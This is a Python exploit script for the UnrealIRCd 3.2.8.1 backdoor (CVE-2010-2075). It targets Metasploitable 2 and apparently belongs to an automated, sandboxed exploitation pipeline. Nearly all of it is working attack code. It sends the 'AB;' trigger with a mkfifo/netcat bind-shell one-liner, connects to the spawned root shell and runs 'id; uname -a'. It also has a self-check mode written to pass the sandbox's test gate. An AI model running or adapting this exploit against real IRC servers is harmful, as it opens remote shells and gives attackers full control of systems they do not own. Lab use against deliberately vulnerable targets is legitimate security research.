#!/usr/bin/env python3
"""UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) — RCE on Metasploitable's IRC port.

UnrealIRCd 3.2.8.1 was distributed for months in 2009-2010 with a backdoor: any
line the daemon reads that begins with the magic bytes ``AB;`` is passed straight
to ``system()`` and executed as the service user (root on Metasploitable 2). It is
blind RCE — the command runs but nothing comes back on the IRC socket — so to make
the breach self-evident we run a command that spawns a bind shell on a known port,
then connect to that port and run ``id``. If ``uid=`` comes back, we have code
execution. Deterministic given a target with a POSIX shell + netcat (Metasploitable
ships both).

Sandbox contract (sandbox/run_sandbox.py) — same two-phase shape as the other PoCs:
  * the target arrives as env var ``TARGET`` (``ip`` or ``ip:port`` for the IRC port);
  * the bind-shell port defaults to 45295, override with ``HALO_UNREAL_BIND_PORT``;
  * TEST phase runs ``--network=none`` with NO ``TARGET`` — so with no target we
    self-check and exit 0 with real stdout, so the harden loop passes us to the
    fire gate rather than discarding a "broken" script;
  * ATTACK phase sets ``TARGET`` and enables the network — we fire for real and
    print the shell's ``id`` output, which trips agent_loop._SHELL_EVIDENCE.

Only stdlib socket is used, so it runs unchanged in python:3.12-slim.
"""

from __future__ import annotations

import os
import re
import socket
import sys
import time

MAGIC = b"AB;"                       # the backdoor trigger — the whole vulnerability
DEFAULT_IRC_PORT = 6667
DEFAULT_BIND_PORT = 45295
PROBE_CMD = b"id; uname -a\n"
_UID_RE = re.compile(r"uid=\d+\(")   # any shell (RCE as any user is the breach here)


def _bind_payload(bind_port: int) -> bytes:
    """A FIFO bind-shell one-liner: spawns /bin/sh bound to ``bind_port``.

    Uses only tools present on Metasploitable 2 (mkfifo, /bin/sh, traditional nc
    with ``-l -p``). The port is embedded as a literal so the command is complete
    and self-contained — no attacker IP needed (bind, not reverse)."""
    return (
        b"rm -f /tmp/.hb;mkfifo /tmp/.hb;"
        b"cat /tmp/.hb|/bin/sh -i 2>&1|nc -l -p " + str(bind_port).encode() +
        b" >/tmp/.hb &"
    )


def _recv_some(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    try:
        return sock.recv(512)
    except OSError:
        return b""


def _drain(sock: socket.socket, timeout: float) -> bytes:
    """Read until the peer stops talking or the window closes."""
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def exploit(host: str, irc_port: int = DEFAULT_IRC_PORT,
            bind_port: int = DEFAULT_BIND_PORT, timeout: float = 8.0) -> str:
    """Trigger the AB; backdoor and return the popped shell's output.

    Raises RuntimeError if no shell answers on the bind port — so a patched/absent
    daemon is reported as a failure, never a false breach.
    """
    # 1) Fire the backdoor: connect to ircd, send `AB;<bind-shell payload>`.
    irc = socket.create_connection((host, irc_port), timeout=timeout)
    try:
        _recv_some(irc, timeout)                  # NOTICE AUTH banner
        irc.sendall(MAGIC + _bind_payload(bind_port) + b"\n")
        _recv_some(irc, 1.0)                       # daemon won't meaningfully reply
    finally:
        irc.close()

    # 2) Talk to the bind shell the command spawned (retry: exec + bind takes a beat).
    shell = None
    last_err: Exception | None = None
    for _ in range(8):
        try:
            shell = socket.create_connection((host, bind_port), timeout=timeout)
            break
        except OSError as e:
            last_err = e
            time.sleep(0.5)
    if shell is None:
        raise RuntimeError(
            f"no shell on {host}:{bind_port} — backdoor did not fire ({last_err})")

    try:
        shell.sendall(PROBE_CMD)
        out = _drain(shell, timeout)
    finally:
        shell.close()

    text = out.decode("utf-8", "replace")
    if not _UID_RE.search(text):
        raise RuntimeError(
            f"connected to {host}:{bind_port} but got no shell output: {text!r}")
    return text


def _selfcheck() -> str:
    """Offline validation for the network-less TEST phase: prove the trigger and
    payload are well-formed without touching a target. Emits no placeholder token,
    so the sandbox never mistakes this for an un-filled template."""
    payload = _bind_payload(DEFAULT_BIND_PORT)
    assert payload.startswith(b"rm -f"), "bind payload malformed"
    assert str(DEFAULT_BIND_PORT).encode() in payload, "bind port missing from payload"
    assert PROBE_CMD.strip(), "probe command empty"
    assert _UID_RE.search("uid=0(root)"), "uid matcher broken"
    return ("SELF-CHECK OK: UnrealIRCd 3.2.8.1 backdoor PoC ready — "
            f"trigger={MAGIC.decode()} irc_port={DEFAULT_IRC_PORT} "
            f"bind_port={DEFAULT_BIND_PORT} probe={PROBE_CMD.strip().decode()}")


def _parse_target(target: str) -> tuple[str, int]:
    target = target.strip()
    if ":" in target:
        host, _, port = target.rpartition(":")
        if port.isdigit():
            return host, int(port)
    return target, DEFAULT_IRC_PORT


def run_from_env(env) -> tuple[int, str]:
    """Return (exit_code, stdout_text). Shared by __main__ and the test suite.

    No TARGET  -> TEST phase: self-check, exit 0 with real stdout (hardens clean).
    TARGET set -> ATTACK phase: fire; exit 0 + shell output on success, else 1.
    """
    target = env.get("TARGET", "").strip()
    if not target:
        return 0, _selfcheck()
    host, irc_port = _parse_target(target)
    bind_port = int(env.get("HALO_UNREAL_BIND_PORT", DEFAULT_BIND_PORT))
    try:
        out = exploit(host, irc_port=irc_port, bind_port=bind_port)
    except Exception as e:  # noqa: BLE001 — any failure is a non-breach, report it
        return 1, f"EXPLOIT FAILED: {e}"
    return 0, f"[UnrealIRCd 3.2.8.1 backdoor] shell on {host}:{bind_port}\n{out}"


if __name__ == "__main__":
    rc, out = run_from_env(os.environ)
    print(out)
    sys.exit(rc)
